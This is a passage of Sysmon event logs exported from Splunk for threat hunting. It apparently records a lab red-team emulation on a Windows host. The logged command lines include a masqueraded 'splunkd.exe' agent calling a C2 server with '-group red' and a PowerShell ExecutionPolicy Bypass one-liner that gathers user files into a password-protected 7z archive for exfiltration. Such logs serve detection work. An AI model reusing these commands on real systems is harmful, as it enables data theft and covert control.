12-12T17:01:31.000-0500",allowed,,,"C:\Program Files\SplunkUniversalForwarder\bin\splunkd.exe",,,,,,"2024-12-12 22:01:30.563",,"192.168.1.4",,"192.168.1.4",,,9001,outbound,WindowsTarget,"10.0.0.5",WindowsTarget,99976,"endpoint_services_processes ms-sysmon-network windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99976,main,1,,,,,,,,,,,,,,,,,,,,,,,,,,"splunkd.exe","{8e02ef74-5344-675b-2706-000000002a00}",,9752,,"splunkd.exe",,,ip,ipv4,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,Tor,,,,,,,,,informational,4,"Network connection",3,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net",,,"WindowsTarget.gwvavixz1yzuxgweuyqj3hytvf.ux.internal.cloudapp.net","10.0.0.5",,,,54550,,,,,established,,,,,,"communicate
network
track_event_signatures",,,,"communicate
network
track_event_signatures",,,tcp,"tcp/9001",,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""BfeToolWin8.exe""","Microsoft Corporation",WindowsTarget,,,,,"C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\","Microsoft AzureÂ®",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:26.462</Data><Data Name='ProcessGuid'>{8e02ef74-5d36-675b-7208-000000002a00}</Data><Data Name='ProcessId'>11940</Data><Data Name='Image'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\BfeToolWin8.exe</Data><Data Name='FileVersion'>2.7.41491.1139</Data><Data Name='Description'>Microsoft AzureÂ®</Data><Data Name='Product'>Microsoft® CoReXT</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>BfeToolWin8.exe</Data><Data Name='CommandLine'>""BfeToolWin8.exe""</Data><Data Name='CurrentDirectory'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8220BC15D2D63251A01233B58FFF8DE9,SHA256=C551E4ED8E7070C46FF0DD04F89D3148DF2E09D66734B064AB8274204C8934F1,IMPHASH=766F73C941B20A3123A0798069B45A82</Data><Data Name='ParentProcessGuid'>{8e02ef74-3d52-675b-5800-000000002a00}</Data><Data Name='ParentProcessId'>3680</Data><Data Name='ParentImage'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe</Data><Data Name='ParentCommandLine'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data>","Process creation",1,99975,,,"2.7.41491.1139",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=8220BC15D2D63251A01233B58FFF8DE9,SHA256=C551E4ED8E7070C46FF0DD04F89D3148DF2E09D66734B064AB8274204C8934F1,IMPHASH=766F73C941B20A3123A0798069B45A82",,,766F73C941B20A3123A0798069B45A82,"C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\BfeToolWin8.exe",,,,System,,,,0x8000000000000000,4,,,"{8e02ef74-3d4a-675b-e703-000000000000}",0x3e7,,,,,,,,,8220BC15D2D63251A01233B58FFF8DE9,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"BfeToolWin8.exe",,"C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe","C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe","{8e02ef74-3d52-675b-5800-000000002a00}",3680,"NT AUTHORITY\SYSTEM",,,,,,,"{8e02ef74-5d36-675b-7208-000000002a00}","'3780'",11940,,,,"Microsoft® CoReXT",,,,,,99975,99975,,,,,"-",,C551E4ED8E7070C46FF0DD04F89D3148DF2E09D66734B064AB8274204C8934F1,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:26.4658724Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:26.4658724Z'/><EventRecordID>99975</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,0,"'5104'","2024-12-12T22:01:26.4658724Z",,,,,"NT AUTHORITY\SYSTEM","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:26.462",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:26.4658724Z'/><EventRecordID>99975</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:26.462</Data><Data Name='ProcessGuid'>{8e02ef74-5d36-675b-7208-000000002a00}</Data><Data Name='ProcessId'>11940</Data><Data Name='Image'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\BfeToolWin8.exe</Data><Data Name='FileVersion'>2.7.41491.1139</Data><Data Name='Description'>Microsoft AzureÂ®</Data><Data Name='Product'>Microsoft® CoReXT</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>BfeToolWin8.exe</Data><Data Name='CommandLine'>""BfeToolWin8.exe""</Data><Data Name='CurrentDirectory'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\</Data><Data Name='User'>NT AUTHORITY\SYSTEM</Data><Data Name='LogonGuid'>{8e02ef74-3d4a-675b-e703-000000000000}</Data><Data Name='LogonId'>0x3e7</Data><Data Name='TerminalSessionId'>0</Data><Data Name='IntegrityLevel'>System</Data><Data Name='Hashes'>MD5=8220BC15D2D63251A01233B58FFF8DE9,SHA256=C551E4ED8E7070C46FF0DD04F89D3148DF2E09D66734B064AB8274204C8934F1,IMPHASH=766F73C941B20A3123A0798069B45A82</Data><Data Name='ParentProcessGuid'>{8e02ef74-3d52-675b-5800-000000002a00}</Data><Data Name='ParentProcessId'>3680</Data><Data Name='ParentImage'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe</Data><Data Name='ParentCommandLine'>C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe</Data><Data Name='ParentUser'>NT AUTHORITY\SYSTEM</Data></EventData></Event>","2024-12-12T17:01:26.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99975,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99975,main,1,,,,,,,,,,,,,"BfeToolWin8.exe","Microsoft Windows","C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe","WindowsAzureGuestAgent.exe","{8e02ef74-3d52-675b-5800-000000002a00}",3680,"WindowsAzureGuestAgent.exe","C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\WindowsAzureGuestAgent.exe",,,,"""BfeToolWin8.exe""","C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\","BfeToolWin8.exe","{8e02ef74-5d36-675b-7208-000000002a00}","MD5=8220BC15D2D63251A01233B58FFF8DE9,SHA256=C551E4ED8E7070C46FF0DD04F89D3148DF2E09D66734B064AB8274204C8934F1,IMPHASH=766F73C941B20A3123A0798069B45A82",11940,System,"BfeToolWin8.exe","C:\WindowsAzure\GuestAgent_2.7.41491.1139_2024-09-12_224342\BfeToolWin8.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,SYSTEM,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"""C:\Program Files\7-Zip\7z.exe"" a C:\Users\inf808\AppData\Local\inf808\StagedFiles.7z C:\Users\inf808\AppData\Local\inf808\* ""-p password""","Igor Pavlov",WindowsTarget,,,,,"C:\Users\inf808\Desktop\","7-Zip Console",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.343</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7108-000000002a00}</Data><Data Name='ProcessId'>1304</Data><Data Name='Image'>C:\Program Files\7-Zip\7z.exe</Data><Data Name='FileVersion'>24.08</Data><Data Name='Description'>7-Zip Console</Data><Data Name='Product'>7-Zip</Data><Data Name='Company'>Igor Pavlov</Data><Data Name='OriginalFileName'>7z.exe</Data><Data Name='CommandLine'>""C:\Program Files\7-Zip\7z.exe"" a C:\Users\inf808\AppData\Local\inf808\StagedFiles.7z C:\Users\inf808\AppData\Local\inf808\* ""-p password""</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=0B24892597DCB0257CDB78B5ED165218,SHA256=707F415D7D581EDD9BCE99A0429AD4629D3BE0316C329E8B9EBD576F7AB50B71,IMPHASH=569D3C66019E4DDA0157D66B4BE0F3F4</Data><Data Name='ParentProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ParentProcessId'>2400</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data>","Process creation",1,99974,,,"24.08",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=0B24892597DCB0257CDB78B5ED165218,SHA256=707F415D7D581EDD9BCE99A0429AD4629D3BE0316C329E8B9EBD576F7AB50B71,IMPHASH=569D3C66019E4DDA0157D66B4BE0F3F4",,,569D3C66019E4DDA0157D66B4BE0F3F4,"C:\Program Files\7-Zip\7z.exe",,,,High,,,,0x8000000000000000,4,,,"{8e02ef74-4233-675b-e1fd-1f0000000000}",0x1ffde1,,,,,,,,,0B24892597DCB0257CDB78B5ED165218,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"7z.exe",,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe","{8e02ef74-5d34-675b-7008-000000002a00}",2400,"WindowsTarget\inf808",,,,,,,"{8e02ef74-5d34-675b-7108-000000002a00}","'3780'",1304,,,,"7-Zip",,,,,,99974,99974,,,,,"-",,707F415D7D581EDD9BCE99A0429AD4629D3BE0316C329E8B9EBD576F7AB50B71,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:24.3449261Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.3449261Z'/><EventRecordID>99974</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,2,"'5104'","2024-12-12T22:01:24.3449261Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:24.343",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.3449261Z'/><EventRecordID>99974</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.343</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7108-000000002a00}</Data><Data Name='ProcessId'>1304</Data><Data Name='Image'>C:\Program Files\7-Zip\7z.exe</Data><Data Name='FileVersion'>24.08</Data><Data Name='Description'>7-Zip Console</Data><Data Name='Product'>7-Zip</Data><Data Name='Company'>Igor Pavlov</Data><Data Name='OriginalFileName'>7z.exe</Data><Data Name='CommandLine'>""C:\Program Files\7-Zip\7z.exe"" a C:\Users\inf808\AppData\Local\inf808\StagedFiles.7z C:\Users\inf808\AppData\Local\inf808\* ""-p password""</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=0B24892597DCB0257CDB78B5ED165218,SHA256=707F415D7D581EDD9BCE99A0429AD4629D3BE0316C329E8B9EBD576F7AB50B71,IMPHASH=569D3C66019E4DDA0157D66B4BE0F3F4</Data><Data Name='ParentProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ParentProcessId'>2400</Data><Data Name='ParentImage'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='ParentCommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""</Data><Data Name='ParentUser'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T17:01:24.000-0500",allowed,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99974,"endpoint_services_processes ms-sysmon-process windows_event_signature windows_ta_data",,,,,,,,WindowsTarget,,,99974,main,1,,,,,,,,,,,,,"7z.exe","Microsoft Windows","powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""","powershell.exe","{8e02ef74-5d34-675b-7008-000000002a00}",2400,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"""C:\Program Files\7-Zip\7z.exe"" a C:\Users\inf808\AppData\Local\inf808\StagedFiles.7z C:\Users\inf808\AppData\Local\inf808\* ""-p password""","C:\Users\inf808\Desktop\","7z.exe","{8e02ef74-5d34-675b-7108-000000002a00}","MD5=0B24892597DCB0257CDB78B5ED165218,SHA256=707F415D7D581EDD9BCE99A0429AD4629D3BE0316C329E8B9EBD576F7AB50B71,IMPHASH=569D3C66019E4DDA0157D66B4BE0F3F4",1304,High,"7z.exe","C:\Program Files\7-Zip\7z.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,"Process creation",1,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"process
report
track_event_signatures",,,,"process
report
track_event_signatures",,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,,,WindowsTarget,,,"2024-12-12 22:01:24.184",,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",11,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.184</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ProcessId'>2400</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_urrmutnk.5zg.ps1</Data><Data Name='CreationUtcTime'>2024-12-12 22:01:24.184</Data><Data Name='User'>WindowsTarget\inf808</Data>",FileCreate,11,99973,,,,,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'",,,,,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,,,,,0x8000000000000000,4,,,,,,,,,,,,,,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,,,,,,,,,,,,,,"{8e02ef74-5d34-675b-7008-000000002a00}","'3780'",2400,,,,,,,,,,99973,99973,,,,,"-",,,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:24.1914826Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.1914826Z'/><EventRecordID>99973</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,"C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_urrmutnk.5zg.ps1",,,,,,,,,,,,,,,11,"System Parameter Settings",,"'5104'","2024-12-12T22:01:24.1914826Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:24.184",2,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>11</EventID><Version>2</Version><Level>4</Level><Task>11</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.1914826Z'/><EventRecordID>99973</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.184</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ProcessId'>2400</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='TargetFilename'>C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_urrmutnk.5zg.ps1</Data><Data Name='CreationUtcTime'>2024-12-12 22:01:24.184</Data><Data Name='User'>WindowsTarget\inf808</Data></EventData></Event>","2024-12-12T17:01:24.000-0500",created,,,,,,,,,,,WindowsTarget,,,,,,,WindowsTarget,,WindowsTarget,99973,"endpoint_services_processes ms-sysmon-filemod windows_event_signature windows_ta_data",,"2024-12-12 22:01:24.184",,,"__PSScriptPolicyTest_urrmutnk.5zg.ps1","C:\Users\inf808\AppData\Local\Temp\__PSScriptPolicyTest_urrmutnk.5zg.ps1",,WindowsTarget,,,99973,main,1,,,,,,,,,,file,,,,,,,,,,,,,,,,"powershell.exe","{8e02ef74-5d34-675b-7008-000000002a00}",,2400,,"powershell.exe","C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,"<_='://../////'><><_='--'_='{----}'/><></><></><><",,,,,,,,,,,,,,,,,,,,,,informational,4,FileCreate,11,"XmlWinEventLog:Microsoft-Windows-Sysmon/Operational",XmlWinEventLog,FedoraThreatHunting,,,,,,,,,,,,,,,,,,,,,"endpoint
filesystem
track_event_signatures",,,,"endpoint
filesystem
track_event_signatures",filesystem,,,,,,,,inf808,,,"'S-1-5-18'",,,,,"Microsoft Sysmon"
,,,,,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",,,,,,,"powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""","Microsoft Corporation",WindowsTarget,,,,,"C:\Users\inf808\Desktop\","Windows PowerShell",,,,,,,,,,,,"Microsoft-Windows-Sysmon/Operational",1,"<Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.077</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ProcessId'>2400</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.3996 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6</Data><Data Name='ParentProcessGuid'>{8e02ef74-585e-675b-6007-000000002a00}</Data><Data Name='ParentProcessId'>11700</Data><Data Name='ParentImage'>C:\Users\Public\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red </Data><Data Name='ParentUser'>WindowsTarget\inf808</Data>","Process creation",1,99972,,,"10.0.19041.3996 (WinBuild.160101.0800)",,,,,,,,"'{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'","MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6",,,3D08F4848535206D772DE145804FF4B6,"C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe",,,,High,,,,0x8000000000000000,4,,,"{8e02ef74-4233-675b-e1fd-1f0000000000}",0x1ffde1,,,,,,,,,2E5A8590CF6848968FC23DE3FA1E25F1,,,,,,,"'Microsoft-Windows-Sysmon'",,,,,,,,,,,,,0,"PowerShell.EXE",,"""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red","C:\Users\Public\splunkd.exe","{8e02ef74-585e-675b-6007-000000002a00}",11700,"WindowsTarget\inf808",,,,,,,"{8e02ef74-5d34-675b-7008-000000002a00}","'3780'",2400,,,,"Microsoft® Windows® Operating System",,,,,,99972,99972,,,,,"-",,9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,,,"S-1-5-18",,,,,,,,,,,,,,,,,,,,,,"'2024-12-12T22:01:24.0792453Z'","<Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.0792453Z'/><EventRecordID>99972</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/>",,,,,,,,,,,,,,,,,1,Devices,2,"'5104'","2024-12-12T22:01:24.0792453Z",,,,,"WindowsTarget\inf808","'S-1-5-18'",,,,,,,,,,"2024-12-12 22:01:24.077",5,,,,,"<Event xmlns='http://schemas.microsoft.com/win/2004/08/events/event'><System><Provider Name='Microsoft-Windows-Sysmon' Guid='{5770385f-c22a-43e0-bf4c-06f5698ffbd9}'/><EventID>1</EventID><Version>5</Version><Level>4</Level><Task>1</Task><Opcode>0</Opcode><Keywords>0x8000000000000000</Keywords><TimeCreated SystemTime='2024-12-12T22:01:24.0792453Z'/><EventRecordID>99972</EventRecordID><Correlation/><Execution ProcessID='3780' ThreadID='5104'/><Channel>Microsoft-Windows-Sysmon/Operational</Channel><Computer>WindowsTarget</Computer><Security UserID='S-1-5-18'/></System><EventData><Data Name='RuleName'>-</Data><Data Name='UtcTime'>2024-12-12 22:01:24.077</Data><Data Name='ProcessGuid'>{8e02ef74-5d34-675b-7008-000000002a00}</Data><Data Name='ProcessId'>2400</Data><Data Name='Image'>C:\Windows\System32\WindowsPowerShell\v1.0\powershell.exe</Data><Data Name='FileVersion'>10.0.19041.3996 (WinBuild.160101.0800)</Data><Data Name='Description'>Windows PowerShell</Data><Data Name='Product'>Microsoft® Windows® Operating System</Data><Data Name='Company'>Microsoft Corporation</Data><Data Name='OriginalFileName'>PowerShell.EXE</Data><Data Name='CommandLine'>powershell.exe -ExecutionPolicy Bypass -C ""$username = $env:USERNAME;$StageDir = \""C:\Users\$username\AppData\Local\$username\"";&amp; \""C:\Program Files\7-Zip\7z.exe\"" a \""$StageDir\StagedFiles.7z\"" \""$StageDir\*\"" \""-p password\"" | Out-Null;sleep 1;ls \""$StageDir\StagedFiles.7z\"" | foreach {$_.FullName} | select""</Data><Data Name='CurrentDirectory'>C:\Users\inf808\Desktop\</Data><Data Name='User'>WindowsTarget\inf808</Data><Data Name='LogonGuid'>{8e02ef74-4233-675b-e1fd-1f0000000000}</Data><Data Name='LogonId'>0x1ffde1</Data><Data Name='TerminalSessionId'>2</Data><Data Name='IntegrityLevel'>High</Data><Data Name='Hashes'>MD5=2E5A8590CF6848968FC23DE3FA1E25F1,SHA256=9785001B0DCF755EDDB8AF294A373C0B87B2498660F724E76C4D53F9C217C7A3,IMPHASH=3D08F4848535206D772DE145804FF4B6</Data><Data Name='ParentProcessGuid'>{8e02ef74-585e-675b-6007-000000002a00}</Data><Data Name='ParentProcessId'>11700</Data><Data Name='ParentImage'>C:\Users\Public\splunkd.exe</Data><Data Name='ParentCommandLine'>""C:\Users\Public\splunkd.exe"" -server http://10.0.0.4:8888 -group red </Data><Data 